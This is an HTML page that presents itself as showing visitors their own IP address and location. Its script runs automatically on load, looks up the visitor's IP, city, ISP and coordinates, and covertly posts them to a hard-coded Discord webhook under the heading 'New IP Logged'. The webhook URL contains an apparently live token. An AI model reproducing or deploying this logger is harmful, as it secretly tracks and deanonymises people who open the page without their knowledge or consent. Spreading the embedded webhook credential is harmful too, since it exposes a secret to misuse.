<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP & Geolocation Tracker</title>
</head>
<body>
    <h2>Your IP and Location</h2>
    <pre id="output">Fetching...</pre>

    <script>
        async function fetchIPData() {
            try {
                let response = await fetch("https://ipwho.is/");
                let data = await response.json();

                if (!data.success) throw new Error("Failed to fetch data");

                let details = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country,
                    isp: data.connection.isp,
                    lat: data.latitude,
                    lon: data.longitude
                };

                document.getElementById("output").innerText = JSON.stringify(details, null, 2);

                // Format data for Discord
                let webhookData = {
                    content: `**New IP Logged**\n\`\`\`json\n${JSON.stringify(details, null, 2)}\n\`\`\``
                };

                let webhookUrl = "https://discordapp.com/api/webhooks/1348733422851461170/Ejz-fNQrQFxtqQ_8Tq3EiVBLDz84omtzuLiDUNqaY53z1f80haoib3vFfFjWZfKQz2EK";  // Replace with your actual webhook URL
                fetch(webhookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(webhookData)
                });

            } catch (error) {
                document.getElementById("output").innerText = "Error fetching data.";
                console.error("Error:", error);
            }
        }

        fetchIPData();
    </script>
</body>
</html>
